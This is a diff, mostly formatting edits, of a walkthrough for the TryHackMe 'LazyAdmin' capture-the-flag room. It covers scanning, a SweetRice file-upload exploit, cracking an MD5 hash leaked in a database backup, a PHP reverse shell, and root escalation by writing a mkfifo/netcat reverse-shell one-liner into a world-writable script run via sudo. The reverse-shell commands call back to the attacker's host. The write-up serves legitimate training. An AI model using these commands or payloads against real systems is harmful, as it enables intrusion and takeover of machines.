@@ -5,12 +5,15 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Linux
 Subscription type: Free
 Description: Easy linux machine to practice your skills
 ```
+
 Room link: [https://tryhackme.com/r/room/lazyadmin](https://tryhackme.com/r/room/lazyadmin)
 
 ## Solution
@@ -18,6 +21,7 @@ Room link: [https://tryhackme.com/r/room/lazyadmin](https://tryhackme.com/r/room
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ nmap -v -sV -sC 10.10.167.58                       
@@ -77,7 +81,9 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds
 ```
+
 We have two services running:
+
 - OpenSSH 7.2p2 on port 22
 - Apache httpd 2.4.18 on port 80
 
@@ -86,6 +92,7 @@ Manually browsing to port 80 shows a `Apache2 Ubuntu Default Page`.
 ### Check for files/directories with gobuster
 
 Next, we check for files/directories on the web service with `gobuster`
+
 ```bash
  ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -u http://10.10.167.58        
@@ -135,6 +142,7 @@ Browsing to the `/content` directory shows an installation of `SweetRice`
 ### Search for exploits
 
 Let's see if there are any exploits available
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ searchsploit sweetrice        
@@ -162,9 +170,11 @@ Shellcodes: No Results
 File Type: Python script, ASCII text executable
 Copied to: /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/LazyAdmin/40716.py
 ```
+
 The Arbitrary File Upload exploit for the highest version listed seems most interesting.
 
 We check it out further
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ head -n 50 40716.py
@@ -216,12 +226,14 @@ payload = {
     'rememberMe':''
 }
 ```
+
 Hhm, it requires authentication with a username and password.
 
 ### Further content discovery with gobuster
 
 Now we continue our discovery in the `/content` directory
-```bash          
+
+```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -u http://10.10.167.58/content
 ===============================================================
@@ -270,6 +282,7 @@ Finished
 ```
 
 In the `changelog.txt` we can see that the version is `1.5.1` and that PHP and MySQL are recommended.
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ curl -L -s http://10.10.167.58/content/changelog.txt | head -n 50 
@@ -330,6 +343,7 @@ core update
 Browsing to the `/content/inc` directory we can see a `mysql_backup` directory.  
 Checking out that directory we see a `mysql_bakup_20191129023059-1.5.1.sql` file  
 with a username and password
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ curl -s http://10.10.167.58/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql | grep -i pass
@@ -341,6 +355,7 @@ Hash: `42f749ade7f9e195bf475f37a44cafcb`
 
 We can try to crack the hash with `hashcat` and the rockyou wordlist.  
 From the hash length we can assume it's a MD5-hash
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ hashcat -a 0 -m 0 '42f749ade7f9e195bf475f37a44cafcb' /usr/share/wordlists/rockyou.txt 
@@ -378,6 +393,7 @@ Hardware.Mon.#1..: Util: 19%
 Started: Thu Sep 26 18:30:12 2024
 Stopped: Thu Sep 26 18:30:23 2024
 ```
+
 And the password is `Password123`.
 
 ### Login on the web portal
@@ -385,7 +401,7 @@ And the password is `Password123`.
 We can test our username and cracked password on the SweetRice login portal  
 `http://10.10.167.58/content/as/`. And it works!
 
-Next, we can create a reverse shell and upload it with the exploit. 
+Next, we can create a reverse shell and upload it with the exploit.
 
 ### Upload a reverse shell
 
@@ -393,12 +409,15 @@ We will use a basic [PHP reverse shell from pentestmonkey](https://github.com/pe
 The file need to have a `.php5` extension (`.php` won't work).
 
 We launch the exploit
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ python 40716.py
 ```
+
 And input the data
-```
+
+```text
 +-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
 |  _________                      __ __________.__                  |
 | /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
@@ -423,19 +442,23 @@ Enter FileName (Example:.htaccess,shell.php5,index.html) : php-reverse-shell.php
 ### Get a reverse shell
 
 Now we start a netcat listener
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ nc -lvnp 12345              
 listening on [any] 12345 ...
 
 ```
+
 And trigger the reverse shell with `curl`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ curl http://10.10.167.58/content/attachment/php-reverse-shell.php5
 ```
 
 Back at the netcat listener we now have a shell
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ nc -lvnp 12345 
@@ -456,6 +479,7 @@ $
 ### Get the user flag
 
 We fix our shell and search for the user flag with `find`
+
 ```bash
 $ python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@THM-Chal:/$ find /home -type f -name [Uu]ser* 2>/dev/null                           
@@ -471,6 +495,7 @@ www-data@THM-Chal:/$
 
 We now start enumerating for ways to escalate our privileges.  
 First we check if we can run any commands as root via `sudo`
+
 ```bash
 www-data@THM-Chal:/$ sudo -l
 sudo -l
@@ -482,9 +507,11 @@ User www-data may run the following commands on THM-Chal:
     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
 www-data@THM-Chal:/$ 
 ```
+
 We can execute `backup.pl` with perl.
 
 Let's examine the backup file
+
 ```bash
 www-data@THM-Chal:/$ cd /home/itguy     
 cd /home/itguy
@@ -509,7 +536,9 @@ cat backup.pl
 
 system("sh", "/etc/copy.sh");
 ```
+
 It will launch another file `/etc/copy.sh`.
+
 ```bash
 www-data@THM-Chal:/home/itguy$ ls -l /etc/copy.sh
 ls -l /etc/copy.sh
@@ -519,11 +548,13 @@ cat /etc/copy.sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 www-data@THM-Chal:/home/itguy$ 
 ```
+
 How nice, the file is world writable and contains a fifo reverse shell.
 
 ### Privilege escalation
 
 We change the IP-adress and port in the file
+
 ```bash
 www-data@THM-Chal:/home/itguy$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.61.233 23456 >/tmp/f' > /etc/copy.sh
 < -i 2>&1|nc 10.14.61.233 23456 >/tmp/f' > /etc/copy.sh                      
@@ -532,21 +563,26 @@ cat /etc/copy.sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.61.233 23456 >/tmp/f
 www-data@THM-Chal:/home/itguy$ 
 ```
+
 And start another netcat listener
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ nc -lvnp 23456
 listening on [any] 23456 ...
 
 ```
+
 Then we trigger the reverse shell
+
 ```bash
 www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
 sudo /usr/bin/perl /home/itguy/backup.pl
 rm: cannot remove '/tmp/f': No such file or directory
 ```
 
-Back at netcat listener #2 
+Back at netcat listener #2
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/LazyAdmin]
 └─$ nc -lvnp 23456
@@ -556,11 +592,13 @@ connect to [10.14.61.233] from (UNKNOWN) [10.10.167.58] 43476
 uid=0(root) gid=0(root) groups=0(root)
 # 
 ```
+
 We are now root!
 
 ### Get the root flag
 
 Finally, we get the root flag
+
 ```bash
 # cd /root
 # ls
